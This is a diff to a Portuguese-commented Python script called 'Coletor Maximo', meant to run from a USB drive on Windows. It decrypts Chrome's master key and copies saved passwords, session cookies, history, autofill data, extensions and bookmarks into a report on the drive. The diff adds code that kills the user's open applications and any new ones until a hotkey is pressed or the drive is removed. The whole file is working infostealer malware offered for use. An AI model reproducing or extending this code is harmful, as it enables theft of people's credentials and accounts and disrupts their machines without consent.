@@ -7,73 +7,142 @@ import sqlite3
 import shutil
 import subprocess
 import win32crypt
+import threading
+import psutil
 from Crypto.Cipher import AES
 from datetime import datetime
 
-# ============================================
-# CONFIGURAÇÕES
-# ============================================
+# =============================================
+# CONFIGURAÇÕES INICIAIS
+# =============================================
 USUARIO = os.getlogin()
 PASTA_ATUAL = os.path.dirname(os.path.abspath(__file__))
 PASTA_SAIDA = os.path.join(PASTA_ATUAL, "Credenciais")
 os.makedirs(PASTA_SAIDA, exist_ok=True)
 
-ARQUIVO_LOG = os.path.join(PASTA_SAIDA, f"log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
+LOG_FILE = os.path.join(PASTA_SAIDA, f"log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
+
+# Flag de parada (será ativada pelo hotkey ou remoção do pendrive)
+stop_block = threading.Event()
 
 def log(texto):
-    # Força a gravação em UTF-8 para evitar erros de codificação
-    with open(ARQUIVO_LOG, "a", encoding="utf-8") as f:
-        f.write(texto + "\n")
-    print(texto.encode('ascii', errors='replace').decode())  # Exibe sem quebrar no console
+    try:
+        with open(LOG_FILE, "a", encoding="utf-8") as f:
+            f.write(str(texto) + "\n")
+    except:
+        pass
+    try:
+        print(texto)
+    except:
+        pass
 
-# ============================================
-# 1. BLOQUEADOR DE APPS (OPCIONAL)
-# ============================================
+# =============================================
+# FUNÇÕES DE BLOQUEIO
+# =============================================
+
+# Lista de processos que NUNCA serão mortos (sistema)
+PROCESSOS_PERMITIDOS = [
+    'System', 'smss.exe', 'csrss.exe', 'wininit.exe', 'services.exe',
+    'lsass.exe', 'svchost.exe', 'winlogon.exe', 'explorer.exe',
+    'taskmgr.exe', 'cmd.exe', 'powershell.exe', 'conhost.exe',
+    'dwm.exe', 'ctfmon.exe', 'Coletor.exe', 'python.exe'
+]
+
+def matar_processos_existentes():
+    """Mata todos os processos do usuário que não estão na lista de permitidos."""
+    log("[BLOQUEIO] Fechando aplicativos abertos...")
+    try:
+        for proc in psutil.process_iter(['pid', 'name', 'username']):
+            try:
+                nome = proc.info['name'].lower()
+                user = proc.info['username'] or ''
+                if (user and USUARIO in user) and nome not in [p.lower() for p in PROCESSOS_PERMITIDOS]:
+                    proc.kill()
+                    log(f"    Fechou: {nome} (PID {proc.info['pid']})")
+                    time.sleep(0.1)
+            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+                pass
+    except Exception as e:
+        log(f"    Erro ao matar processos: {e}")
+    log("[BLOQUEIO] Processos iniciais fechados.")
+
 def ativar_bloqueio():
-    log("[!] Ativando bloqueio...")
-    script = """
-    while ($true) {
-        $novos = Get-Process | Where-Object { $_.StartTime -gt (Get-Date).AddSeconds(-2) -and $_.ProcessName -notin @('powershell','cmd','explorer','Coletor') }
-        foreach ($p in $novos) {
-            try { Stop-Process -Id $p.Id -Force -ErrorAction SilentlyContinue } catch {}
-        }
-        Start-Sleep -Milliseconds 500
-    }
-    """
-    path = os.path.join(PASTA_SAIDA, "block.ps1")
-    with open(path, "w") as f:
-        f.write(script)
-    subprocess.Popen(
-        f'powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "{path}"',
-        shell=True,
-        stdout=subprocess.DEVNULL,
-        stderr=subprocess.DEVNULL
-    )
-    log("[OK] Bloqueio ativado!")
-    return path
+    """Inicia o bloqueio contínuo (mata novos processos)."""
+    log("[BLOQUEIO] Ativando bloqueio...")
 
-def desativar_bloqueio(path):
-    log("[!] Desativando bloqueio...")
-    try: os.remove(path)
-    except: pass
-    subprocess.run('taskkill /f /im powershell.exe', shell=True, capture_output=True)
-    log("[OK] Bloqueio desativado!")
+    # Mata processos existentes
+    matar_processos_existentes()
 
-# ============================================
-# 2. COLETA DE DADOS (SEM EMOJIS)
-# ============================================
+    # Loop de bloqueio
+    def loop_bloqueio():
+        while not stop_block.is_set():
+            try:
+                # Verifica se o pendrive ainda existe
+                if not os.path.exists(PASTA_ATUAL):
+                    log("[BLOQUEIO] Pendrive removido. Desativando.")
+                    stop_block.set()
+                    break
+
+                # Pega todos os processos atuais
+                for proc in psutil.process_iter(['pid', 'name', 'username', 'create_time']):
+                    try:
+                        nome = proc.info['name'].lower()
+                        user = proc.info['username'] or ''
+                        # Se for do usuário e não estiver na lista de permitidos
+                        if (user and USUARIO in user) and nome not in [p.lower() for p in PROCESSOS_PERMITIDOS]:
+                            # Só mata se for novo (criado após 1 segundo atrás)
+                            if time.time() - proc.info['create_time'] < 2:
+                                proc.kill()
+                                log(f"    Bloqueou: {nome} (PID {proc.info['pid']})")
+                    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+                        pass
+            except Exception as e:
+                log(f"    Erro no loop: {e}")
+            time.sleep(0.5)
+
+    # Executa o loop em uma thread separada
+    thread = threading.Thread(target=loop_bloqueio, daemon=True)
+    thread.start()
+    log("[BLOQUEIO] Ativado. Ctrl+Shift+Esc para desativar.")
+    return thread
+
+def desativar_bloqueio():
+    """Desativa o bloqueio."""
+    log("[BLOQUEIO] Desativando...")
+    stop_block.set()
+    log("[BLOQUEIO] Desativado.")
+
+# =============================================
+# CONFIGURAÇÃO DO HOTKEY (Ctrl+Shift+Esc)
+# =============================================
+def iniciar_hotkey():
+    """Configura o hotkey para desativar o bloqueio."""
+    try:
+        import keyboard
+        keyboard.add_hotkey('ctrl+shift+esc', lambda: stop_block.set())
+        log("[HOTKEY] Ctrl+Shift+Esc configurado para desativar.")
+    except ImportError:
+        log("[HOTKEY] Biblioteca 'keyboard' não encontrada. O hotkey não funcionará.")
+    except Exception as e:
+        log(f"[HOTKEY] Erro: {e}")
+
+# =============================================
+# FUNÇÕES DE COLETA (MANTIDAS IGUAIS)
+# =============================================
 def pegar_chave():
     path = f"C:/Users/{USUARIO}/AppData/Local/Google/Chrome/User Data/Local State"
+    if not os.path.exists(path):
+        raise FileNotFoundError(f"Chrome não encontrado: {path}")
     with open(path, 'r') as f:
         local = json.load(f)
-    chave = base64.b64decode(local["os_crypt"]["encrypted_key"])[5:]
-    return win32crypt.CryptUnprotectData(chave, None, None, None, 0)[1]
+    chave_enc = base64.b64decode(local["os_crypt"]["encrypted_key"])[5:]
+    return win32crypt.CryptUnprotectData(chave_enc, None, None, None, 0)[1]
 
 def coletar_senhas(chave):
-    log("[+] Coletando senhas...")
+    log("  [SENHAS] ...")
     caminho = f"C:/Users/{USUARIO}/AppData/Local/Google/Chrome/User Data/Default/Login Data"
     if not os.path.exists(caminho):
-        return ["Chrome nao encontrado"]
+        return ["Chrome não possui dados de login."]
     temp = os.path.join(PASTA_SAIDA, "temp.db")
     shutil.copyfile(caminho, temp)
     creds = []
@@ -92,11 +161,11 @@ def coletar_senhas(chave):
             pass
     conn.close()
     os.remove(temp)
-    log(f"    OK {len(creds)} senhas")
+    log(f"    OK {len(creds)} senhas.")
     return creds
 
 def coletar_cookies(chave):
-    log("[+] Coletando cookies...")
+    log("  [COOKIES] ...")
     caminho = f"C:/Users/{USUARIO}/AppData/Local/Google/Chrome/User Data/Default/Network/Cookies"
     if not os.path.exists(caminho):
         return []
@@ -118,11 +187,11 @@ def coletar_cookies(chave):
             pass
     conn.close()
     os.remove(temp)
-    log(f"    OK {len(cookies)} cookies")
+    log(f"    OK {len(cookies)} cookies.")
     return cookies
 
 def coletar_historico():
-    log("[+] Coletando historico...")
+    log("  [HISTORICO] ...")
     caminho = f"C:/Users/{USUARIO}/AppData/Local/Google/Chrome/User Data/Default/History"
     if not os.path.exists(caminho):
         return []
@@ -136,11 +205,11 @@ def coletar_historico():
         hist.append(f"URL: {url}\nTítulo: {titulo}\n")
     conn.close()
     os.remove(temp)
-    log(f"    OK {len(hist)} sites")
+    log(f"    OK {len(hist)} sites.")
     return hist
 
 def coletar_autofill():
-    log("[+] Coletando autofill...")
+    log("  [AUTOFILL] ...")
     caminho = f"C:/Users/{USUARIO}/AppData/Local/Google/Chrome/User Data/Default/Web Data"
     if not os.path.exists(caminho):
         return []
@@ -168,14 +237,14 @@ def coletar_autofill():
         pass
     conn.close()
     os.remove(temp)
-    log(f"    OK {len(dados)} itens")
+    log(f"    OK {len(dados)} itens.")
     return dados
 
 def coletar_extensoes():
-    log("[+] Coletando extensoes...")
+    log("  [EXTENSOES] ...")
     path = f"C:/Users/{USUARIO}/AppData/Local/Google/Chrome/User Data/Default/Extensions"
     if not os.path.exists(path):
-        return ["Nenhuma extensao"]
+        return ["Nenhuma extensão encontrada."]
     ext = []
     for e in os.listdir(path):
         try:
@@ -187,11 +256,11 @@ def coletar_extensoes():
                     ext.append(f"  {nome} ({e})")
         except:
             ext.append(f"  {e}")
-    log(f"    OK {len(ext)} extensoes")
+    log(f"    OK {len(ext)} extensões.")
     return ext
 
 def coletar_favoritos():
-    log("[+] Coletando favoritos...")
+    log("  [FAVORITOS] ...")
     path = f"C:/Users/{USUARIO}/AppData/Local/Google/Chrome/User Data/Default/Bookmarks"
     if not os.path.exists(path):
         return []
@@ -207,26 +276,32 @@ def coletar_favoritos():
                     extrair(child, pasta + "/" + child.get("name",""))
     extrair(data.get("roots", {}).get("bookmark_bar", {}))
     extrair(data.get("roots", {}).get("other", {}))
-    log(f"    OK {len(favs)} favoritos")
+    log(f"    OK {len(favs)} favoritos.")
     return favs
 
-# ============================================
-# 3. EXECUÇÃO PRINCIPAL
-# ============================================
+# =============================================
+# MAIN
+# =============================================
 def main():
     log("="*60)
-    log("COLETOR MAXIMO")
+    log("COLETOR MAXIMO + BLOQUEIO TOTAL")
     log(f"Data: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}")
-    log(f"Usuario: {USUARIO}")
+    log(f"Usuário: {USUARIO}")
     log("="*60)
 
-    script_bloqueio = ativar_bloqueio()
+    # Inicia o hotkey para desativar
+    iniciar_hotkey()
+
+    # Ativa o bloqueio (mata processos existentes e novos)
+    thread_bloqueio = ativar_bloqueio()
 
     try:
+        # Coleta os dados do Chrome
+        log("\n[+] Obtendo chave...")
         chave = pegar_chave()
-        log("\n[+] Chave obtida!")
+        log("[OK] Chave obtida.")
 
-        log("\n[+] COLETANDO:")
+        log("\n[+] Coletando dados:")
         dados = {
             "senhas": coletar_senhas(chave),
             "cookies": coletar_cookies(chave),
@@ -236,16 +311,15 @@ def main():
             "favoritos": coletar_favoritos()
         }
 
+        # Salva relatório
         nome = f"credenciais_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
         caminho = os.path.join(PASTA_SAIDA, nome)
-
         with open(caminho, "w", encoding="utf-8") as f:
             f.write("="*80 + "\n")
             f.write("RELATORIO COMPLETO\n")
             f.write(f"Data: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n")
             f.write(f"Usuario: {USUARIO}\n")
             f.write("="*80 + "\n\n")
-
             for secao, itens in dados.items():
                 f.write(f"[{secao.upper()}]\n")
                 f.write("-"*40 + "\n")
@@ -253,25 +327,35 @@ def main():
                     for item in itens:
                         f.write(item + "\n")
                 else:
-                    f.write("Nenhum dado encontrado\n")
+                    f.write("Nenhum dado encontrado.\n")
                 f.write("\n")
 
         shutil.copy(caminho, os.path.join(PASTA_ATUAL, nome))
+        log(f"\n[OK] Relatório salvo em: {caminho}")
+        log(f"[OK] Cópia na raiz: {nome}")
 
-        log(f"\n[OK] Relatorio salvo em: {caminho}")
-        log(f"[OK] Copia na raiz do pendrive: {nome}")
-
+    except FileNotFoundError as e:
+        log(f"[ERRO] {e}")
+        with open(os.path.join(PASTA_SAIDA, "chrome_nao_encontrado.txt"), "w") as f:
+            f.write(str(e))
     except Exception as e:
         log(f"[ERRO] {e}")
         import traceback
         log(traceback.format_exc())
-
     finally:
-        desativar_bloqueio(script_bloqueio)
+        # Aguarda o usuário desbloquear manualmente (pressionando a tecla)
+        log("\n[!] Bloqueio ativo. Pressione Ctrl+Shift+Esc ou remova o pendrive para desativar.")
+        # Espera até que a flag de parada seja acionada
+        while not stop_block.is_set():
+            time.sleep(1)
+        # Desativa o bloqueio
+        desativar_bloqueio()
+        if thread_bloqueio.is_alive():
+            thread_bloqueio.join(timeout=2)
 
     log("\n" + "="*60)
-    log("[OK] FINALIZADO!")
-    time.sleep(5)
+    log("FIM")
+    time.sleep(3)
 
 if __name__ == "__main__":
     main()
